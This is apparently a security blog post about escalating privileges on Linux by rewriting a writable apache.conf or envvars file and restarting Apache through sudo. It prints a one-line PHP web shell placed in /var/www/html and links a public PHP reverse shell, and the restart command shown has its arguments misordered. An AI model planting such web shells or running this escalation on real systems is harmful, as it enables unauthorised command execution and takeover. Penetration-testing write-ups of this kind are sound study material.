+++
author = "kiwiyumi"
date = "2024-05-31"
description = "Abusing  Apache Misconfiguration - Privilege Escalation"
title = "Abusing  Apache Misconfiguration - Privilege Escalation"
tags = [
    "privesc",
    "apache",
    "Web-server"
]
+++

<!--more-->

In this article, we're going to talk about a technique for escalating privileges, where the initial vector comes from the misconfiguration of the widely known server, Apache!

# A little introduction to Apache

It all started in 1995, when the Apache HTTP server project was created with the aim of creating and maintaining an open source HTTP server for modern operating systems, mainly UNIX and Windows. Maintaining efficiency, security and synchronization with current HTTP protocol standards.

> "The Number One HTTP Server On The Internet" - Apache Official Website.

# Overview 

When installing the Apache server on your machine, ubuntu for example, you can locate the configuration files in **/etc/apache2**. The following images show an example of the files and directories created:

![Config files!](/assets/images/abusing-apache-misconfiguration-privilege-escalation/6bf835ee-e63a-4d03-b465-4e358df6730f.png)


# How to check this vulnerability

If you have permissions to restart the apache server, either because of a misconfiguration or because you can run as root. The following code exemplifies a **sudo -l** for a user:

```bash
User www-data may run the following commands on machine:
    (ALL) NOPASSWD: /usr/sbin/service apache2 restart
```


The vulnerability in question is due to improper permission to write from **apache.conf** or **envvars**, as these files define which user will run apache.

The following image shows an incorrectly configured **apache.conf** file:

```bash
ls -la /etc/apache2/apache.conf
```

![](/assets/images/abusing-apache-misconfiguration-privilege-escalation/a74938bb-f1a0-40a5-bc2b-c2016f2c51ea.png)

The following image shows an incorrectly configured **envvars** file:

```bash
ls -la /etc/apache2/envvars
```

![](/assets/images/abusing-apache-misconfiguration-privilege-escalation/fb671cd9-31a5-47bf-bc13-c822054296af.png)

# Exploit - The best part

### 1 - Change the files

Depending on your operating scenario, you'll need to make changes in different ways, so below you can see some of the ways you can change users.

In the **apache.conf** file, change the following user and group lines to the existing users on your machine, in the example user john:

![](/assets/images/abusing-apache-misconfiguration-privilege-escalation/c55311ad-6e8a-40d3-995a-6f1a544d7408.png)

In the **envvars** file, change the following variables for existing users on your machine, in the example user john:

![](/assets/images/abusing-apache-misconfiguration-privilege-escalation/aa10e0d4-f4a8-4662-ba7d-f6a68fd8d9e3.png)

### 2 - Create a maliciuos file

As an example, I created the following PHP code in the **/var/www/html** directory, called **file.php**:

```php
<?php
    system($_REQUEST['cmd']);
?>
```

You can certainly create a file with a web shell or use a revese shell, like the one in [pentest monkey](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php).

### 3 - Restart the Apache Server

Before you finish, simply restart the Apache server to update the settings we have installed.

```
sudo /usr/bin/service restart apache2
```

### 4 - Go pwned

Access your file and happy ending:

![](/assets/images/abusing-apache-misconfiguration-privilege-escalation/aa10e0d4-f4a8-4662-ba7d-f6a68fd8d9e3.png)

# Fonts

- Apache HTTP Server Project. (2024, May 31). Apache Software Foundation. [http://httpd.apache.org/](http://httpd.apache.org/)
- Apache configuration privilege escalation. (2024, May 31). Exploit Notes. [https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/apache-conf-privilege-escalation/)
